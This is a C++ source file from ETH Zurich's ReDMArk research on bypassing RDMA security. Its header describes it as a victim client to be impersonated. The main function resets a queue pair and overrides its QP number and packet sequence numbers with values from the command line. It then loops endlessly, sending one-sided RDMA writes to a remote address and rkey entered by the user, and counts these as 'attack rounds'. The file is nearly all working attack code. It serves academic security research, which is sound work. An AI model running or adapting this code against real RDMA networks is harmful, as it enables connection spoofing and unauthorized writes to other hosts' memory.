/**                                                                                                      
 * ReDMArk: Bypassing RDMA Security Mechanisms
 * 
 * Launch a client that will be impersonated.
 *
 * Copyright (c) 2020-2021 ETH-Zurich. All rights reserved.
 * 
 * Author(s): Konstantin Taranov <konstantin.taranov@inf.ethz.ch>
 * 
 */

#include "verbsEP.hpp"
#include "connectRDMA.hpp"
#include <chrono>
#include "cxxopts.hpp"
#include <thread> 
//#include <rdma/ib_verbs.h>

cxxopts::ParseResult
parse(int argc, char* argv[])
{
    cxxopts::Options options(argv[0], "A victim client. It will be impersonated.");
    options
      .positional_help("[optional args]")
      .show_positional_help();
 
  try
  {
 
    options.add_options()
      ("a,address", "IP address of the victim", cxxopts::value<std::string>(), "IP")
      ("help", "Print help")
     ;
 
    auto result = options.parse(argc, argv);

    if (result.count("help"))
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    if (result.count("address") == 0)
    {
      std::cout << options.help({""}) << std::endl;
      exit(0);
    }

    return result;

  } catch (const cxxopts::OptionException& e)
  {
    std::cout << "error parsing options: " << e.what() << std::endl;
    std::cout << options.help({""}) << std::endl;
    exit(1);
  }
}

 
  
void print_data(VerbsEP *ep){

  struct ibv_qp_attr attr;
  struct ibv_qp_init_attr init_attr;
  int ret = ibv_query_qp(ep->qp, &attr, IBV_QP_RQ_PSN | IBV_QP_SQ_PSN, &init_attr );
  assert(ret==0 && "ibv_query_qp failed");
  printf("PSNs. receive-PSN: %u send-PSN %u \n", attr.rq_psn, attr.sq_psn);
  printf("QPN %u \n",ep->qp->qp_num);

}


std::vector<VerbsEP *> connections;

int main(int argc, char* argv[]){

  // struct ib_qp ibqp;
  // printf("ib_qp address: %08x, %08x\n", &ibqp, &(ibqp.qp_num));

  // auto allparams = parse(argc,argv);

  // std::string ip = allparams["address"].as<std::string>();  
  std::string ip(argv[2]);

  printf("The test sends a message each 60 seconds.");
 

  int port = 9999;
  ClientRDMA * client = new ClientRDMA(const_cast<char*>(ip.c_str()),port);
  struct ibv_qp_init_attr attr;
  struct rdma_conn_param conn_param;
 
  memset(&attr, 0, sizeof(attr));
  attr.cap.max_send_wr = 1;
  attr.cap.max_recv_wr = 1;
  attr.cap.max_send_sge = 1;
  attr.cap.max_recv_sge = 1;
  attr.cap.max_inline_data = 0;
  attr.qp_type = IBV_QPT_RC;

  memset(&conn_param, 0 , sizeof(conn_param));
  conn_param.responder_resources = 0;
  conn_param.initiator_depth =  0;
  conn_param.retry_count = 0;  
  conn_param.rnr_retry_count = 0;  
  
  struct ibv_pd* pd = NULL;

  VerbsEP *ep = client->connectEP(&attr,&conn_param,pd);
  pd = ep->pd;
  
  print_data(ep);
   
  char* ptr = (char*)malloc(4096);

  struct ibv_qp_attr init_attr, rtr_attr, rts_attr;
  struct ibv_qp_init_attr dummy_init_attr;
  int ret;
  memset(&init_attr, 0, sizeof(init_attr));
  memset(&rtr_attr, 0, sizeof(rtr_attr));
  memset(&rts_attr, 0, sizeof(rts_attr));
  if ((ret = ibv_query_qp(ep->qp, &init_attr, IBV_QP_STATE | IBV_QP_PKEY_INDEX | IBV_QP_PORT | IBV_QP_ACCESS_FLAGS, &dummy_init_attr ))) {
	  printf("Failed to query init_attr, error_msg: %s\n", strerror(ret));
  } else {
	  init_attr.qp_state = IBV_QPS_INIT;
	  printf("init_attr: %d, %hu, %u, %08x\n", init_attr.qp_state, init_attr.pkey_index, (uint32_t)init_attr.port_num, init_attr.qp_access_flags);
  }
  if ((ret = ibv_query_qp(ep->qp, &rtr_attr, IBV_QP_STATE | IBV_QP_AV | IBV_QP_PATH_MTU | IBV_QP_DEST_QPN | IBV_QP_RQ_PSN | IBV_QP_MAX_DEST_RD_ATOMIC | IBV_QP_MIN_RNR_TIMER, &dummy_init_attr))) {
	  printf("Failed to query rtr_attr, error_msg: %s\n", strerror(ret));
  } else {
	  rtr_attr.qp_state = IBV_QPS_RTR;
	  rtr_attr.dest_qp_num = atoi(argv[3]);
	  rtr_attr.rq_psn = 100; // TODO
  }
  if ((ret = ibv_query_qp(ep->qp, &rts_attr, IBV_QP_STATE | IBV_QP_SQ_PSN | IBV_QP_TIMEOUT | IBV_QP_RETRY_CNT | IBV_QP_RNR_RETRY | IBV_QP_MAX_QP_RD_ATOMIC, &dummy_init_attr))) {
	  printf("Failed to query rts_attr, error_msg: %s\n", strerror(ret));
  } else {
	  rts_attr.qp_state = IBV_QPS_RTS;
	  rts_attr.sq_psn = atoi(argv[4]);
  }

  struct ibv_qp_attr qp_attr;
  memset(&qp_attr, 0, sizeof(qp_attr));
  qp_attr.qp_state = IBV_QPS_RESET;

  if ((ret = ibv_modify_qp(ep->qp, &qp_attr, IBV_QP_STATE))) {
          printf("Failed to reset state, ret: %d\n", ret);
  }

  if ((ret = ibv_modify_qp(ep->qp, &init_attr, IBV_QP_STATE | IBV_QP_PKEY_INDEX | IBV_QP_PORT | IBV_QP_ACCESS_FLAGS))) {
	  printf("Failed to init state, error_msg: %s\n", strerror(ret));
  }

  if (argc >= 6) {
	  ep->qp->qp_num = atoi(argv[5]);
  }
  if ((ret = ibv_modify_qp(ep->qp, &rtr_attr, IBV_QP_STATE | IBV_QP_AV | IBV_QP_PATH_MTU | IBV_QP_DEST_QPN | IBV_QP_RQ_PSN | IBV_QP_MAX_DEST_RD_ATOMIC | IBV_QP_MIN_RNR_TIMER))) {
	  printf("Failed to change to RTR, error_msg: %s\n", strerror(ret));
  }

  if ((ret = ibv_modify_qp(ep->qp, &rts_attr, IBV_QP_STATE | IBV_QP_SQ_PSN | IBV_QP_TIMEOUT | IBV_QP_RETRY_CNT | IBV_QP_RNR_RETRY | IBV_QP_MAX_QP_RD_ATOMIC))) {
	  printf("Failed to change to RTS, error_msg: %s\n", strerror(ret));
  }
  struct ibv_mr * mr = ep->reg_mem(ptr,4096);
  
  // print_data(ep);

  // ep->send_signaled(1, (uint64_t)mr->addr, mr->lkey, 16);

  // struct ibv_wc wc;
  // while( ep->poll_send_completion(&wc) == 0){

  // }
  // printf("A message is sent. Completion status is %d\n",wc.status);

  // print_data(ep);
 
  uint32_t counter = 0;
  uint64_t remote_addr;
  uint32_t rkey;
  printf("\nNow, let's try write. Input remote address and rkey:\n");
  int res = scanf("%lu %u", &remote_addr, &rkey);
  if (res != 2) {
    printf("Need two inputs\n");
    exit(-2);
  }
  uint32_t totalAttackRounds = 1;

  while(true){
    // printf("Next print in 5 seconds\n");
    // std::this_thread::sleep_for(std::chrono::milliseconds(5000));
    // print_data(ep);
    // printf("Next print in 55 seconds. and I will try to send \n");
    // std::this_thread::sleep_for(std::chrono::milliseconds(55000));
    // print_data(ep);

    // ep->send_signaled(1, (uint64_t)mr->addr, mr->lkey, 16);

    // struct ibv_wc wc;
    // while( ep->poll_send_completion(&wc) == 0){

    // }
    // printf("A message is sent. Completion status is %d\n",wc.status);

    // uint64_t remote_addr;
    // uint32_t rkey;
    // printf("\nNow, let's try write. Input \"0 0\" for skipping one-sided write, or input remote address and rkey:\n");
    // scanf("%lu %u", &remote_addr, &rkey);
    // if (remote_addr != 0) {
    if (true) {
	ptr[0] = totalAttackRounds;
	counter = (counter + 1) % 1024;
	if (counter == 0)
            totalAttackRounds++;
        ep->write_signaled(1, (uint64_t)mr->addr, mr->lkey, remote_addr + counter, rkey, 1);

        // struct ibv_wc wc;
        // while( ep->poll_send_completion(&wc) == 0){
    
        // }
        // printf("A message is written. Completion status is %d\n",wc.status);

	rts_attr.sq_psn += 1;
	if ((ret = ibv_modify_qp(ep->qp, &qp_attr, IBV_QP_STATE))) {
	        printf("Failed to reset state, ret: %d\n", ret);
	}
	
	if ((ret = ibv_modify_qp(ep->qp, &init_attr, IBV_QP_STATE | IBV_QP_PKEY_INDEX | IBV_QP_PORT | IBV_QP_ACCESS_FLAGS))) {
	        printf("Failed to init state, error_msg: %s\n", strerror(ret));
	}
	
	if ((ret = ibv_modify_qp(ep->qp, &rtr_attr, IBV_QP_STATE | IBV_QP_AV | IBV_QP_PATH_MTU | IBV_QP_DEST_QPN | IBV_QP_RQ_PSN | IBV_QP_MAX_DEST_RD_ATOMIC | IBV_QP_MIN_RNR_TIMER))) {
	        printf("Failed to change to RTR, error_msg: %s\n", strerror(ret));
	}
	
	if ((ret = ibv_modify_qp(ep->qp, &rts_attr, IBV_QP_STATE | IBV_QP_SQ_PSN | IBV_QP_TIMEOUT | IBV_QP_RETRY_CNT | IBV_QP_RNR_RETRY | IBV_QP_MAX_QP_RD_ATOMIC))) {
	        printf("Failed to change to RTS, error_msg: %s\n", strerror(ret));
	}

	// printf("Write sent, check server side\n");
	printf ("data: %d, location %d\n", totalAttackRounds, counter);
	usleep(100);
    }

  }
  
  return 0; 
}

 
 
 
